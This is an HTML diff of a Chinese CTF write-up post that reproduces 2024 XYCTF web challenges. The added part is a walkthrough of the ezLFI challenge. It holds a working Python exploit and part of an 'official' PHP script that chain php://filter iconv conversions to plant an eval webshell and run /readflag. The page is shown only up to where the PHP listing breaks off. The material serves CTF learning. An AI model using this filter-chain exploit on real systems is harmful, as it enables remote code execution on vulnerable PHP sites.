@@ -10,7 +10,7 @@
 <meta property='og:description' content=" web ezhttp 查看源码有提示\n敏锐的感觉robots.txt有东西\n直接看txt文件就好，拿到账户密码。\n根据响应改一下referer\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/'>
 <meta property='og:site_name' content='罗铠鸿'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-03-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-26T00:00:00&#43;00:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-04-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-23T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2024-xyctf-web-复现">
 <meta name="twitter:description" content=" web ezhttp 查看源码有提示\n敏锐的感觉robots.txt有东西\n直接看txt文件就好，拿到账户密码。\n根据响应改一下referer\n">
     <link rel="shortcut icon" href="/favicon.ico" />
@@ -329,6 +329,10 @@
     </li>
     <li><a href="#pharme"><strong>pharme</strong></a></li>
     <li><a href="#ezlfi">ezLFI</a></li>
+    <li><a href="#连连看到底是连连什么看">连连看到底是连连什么看</a></li>
+    <li><a href="#give-me-flag">give me flag</a></li>
+    <li><a href="#login">login</a></li>
+    <li><a href="#baby_unserialize">Baby_Unserialize</a></li>
   </ol>
 </nav>
         </div>
@@ -382,7 +386,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-03-26</time>
+                <time class="article-time--published">2025-04-23</time>
             </div>
         
 
@@ -397,7 +401,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 14 分钟
+                    阅读时长: 19 分钟
                 </time>
             </div>
         
@@ -1867,6 +1871,650 @@
     >php://filter特性包含任意文件getshell | CTF导航</a></p>
 <p><a class="link" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"  target="_blank" rel="noopener"
     >https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+<p>简单就是通过不同的编码转换构造字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:49819/?file=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_to_use</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/readflag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># &lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># generate some garbage base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># get rid of equal signs</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="n">command</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="n">final_payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>官方给出的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 基础payload，这是一个被base64编码的字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 解码后的内容是 &lt;?php @eval($_REQUEST[&#39;cmd&#39;]);，
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// 定义一个转换规则数组，每个字符对应多种iconv转换规则组合
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 这些规则用于在字符编码转换过程中混淆payload，绕过安全检测
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$conversions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// &#39;/&#39; 字符的转换规则，通过多次iconv转换来混淆数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;/&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 数字字符的转换规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 每个数字对应多个稀奇古怪的字符编码转换规则组合
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;0&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;1&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;2&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;3&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;5&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;6&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 大写字母的转换规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;A&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;E&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;F&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;G&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;H&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;I&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;J&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;K&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;L&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;M&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;N&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;O&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Q&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;S&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;T&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;X&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Z&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 小写字母的转换规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 同样使用各种稀奇古怪的字符编码转换组合来混淆数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;b&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#39;</span><span class="p">,</span>
